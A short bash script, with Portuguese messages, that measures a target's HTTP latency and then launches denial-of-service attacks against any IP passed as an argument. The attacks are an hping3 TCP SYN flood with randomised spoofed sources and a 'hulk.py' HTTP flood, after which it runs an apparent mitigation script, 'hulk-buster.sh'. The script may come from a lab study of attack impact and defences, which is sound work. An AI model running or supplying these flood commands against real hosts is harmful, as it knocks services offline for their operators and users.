#!/bin/bash

pingu()
{
	IP=$1
	REP=$2
	PRINT=$3
	echo "Calculando tempo de conexao para $IP..."
	httping $IP -c $REP > temp_httping.txt
	echo "Tempo $PRINT" `tail -n 1 temp_httping.txt | awk '{print $4}' | cut -d"/" -f2`

}

[ $1 ] && [ $2 ] || { echo "Uso: $0 <ip> <repeticoes>";exit; }

IP=$1
REP=$2


echo "============================="
pingu $IP $REP "medio:"
echo "============================="

echo ""
echo "Proximo teste: TCP SYN FLOOD"
echo ""

sleep 5

echo "============================="
echo "Ataque TCP SYN FLOOD iniciado"
xterm -e "sudo hping3 -c 15000 -d 120 -S -w 512 -p 80 --flood --rand-source $IP" &
sleep 5
pingu $IP $REP "medio com tcp syn flood:"

sleep 10

echo "============================="
echo ""
echo "Proximo teste: hulk"
echo ""

echo "============================="
echo "Ataque hulk iniciado"
xterm -e "python hulk.py $IP" &
sleep 3
pingu $IP $REP "medio com ataque hulk:"
echo "============================="
bash hulk-buster.sh



rm temp_httping.txt
